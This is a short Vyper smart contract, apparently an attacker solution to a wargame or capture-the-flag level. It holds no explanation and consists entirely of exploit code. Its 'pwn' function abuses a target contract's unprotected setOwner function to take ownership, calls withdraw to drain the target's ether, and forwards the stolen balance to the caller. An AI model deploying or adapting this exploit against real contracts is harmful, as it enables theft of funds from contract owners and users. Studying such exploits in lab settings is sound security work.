#pragma version 0.4.0

interface Target:
    def withdraw(): nonpayable
    def setOwner(owner: address): nonpayable

target: public(Target)

@deploy
def __init__(target: address):
    self.target = Target(target)

@external
@payable
def __default__():
    pass

@external
def pwn():
    extcall self.target.setOwner(self)
    extcall self.target.withdraw()
    send(msg.sender, self.balance)
    pass